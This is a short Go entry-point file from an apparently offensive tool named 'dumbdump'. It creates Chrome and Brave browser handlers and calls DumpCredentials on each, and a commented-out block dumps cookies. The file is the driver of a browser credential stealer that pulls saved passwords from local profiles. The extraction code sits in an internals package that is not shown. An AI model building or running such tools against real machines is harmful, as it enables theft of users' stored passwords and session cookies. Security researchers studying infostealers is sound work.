package main

import (
	"fmt"

	"github.com/antoninoLorenzo/dumbdump/internals"
	_ "github.com/mattn/go-sqlite3"
)

func main() {

	chrome, err := internals.NewChrome()
	if err != nil {
		panic(err)
	}

	_, err = chrome.DumpCredentials()
	if err != nil {
		fmt.Printf("[!] %s\n", err)
	}
	/*
		_, err = chrome.DumpCookies()
		if err != nil {
			panic(err)
		}
	*/

	brave, err := internals.NewBrave()
	if err != nil {
		panic(err)
	}

	_, err = brave.DumpCredentials()
	if err != nil {
		fmt.Printf("[!] %s\n", err)
	}
}
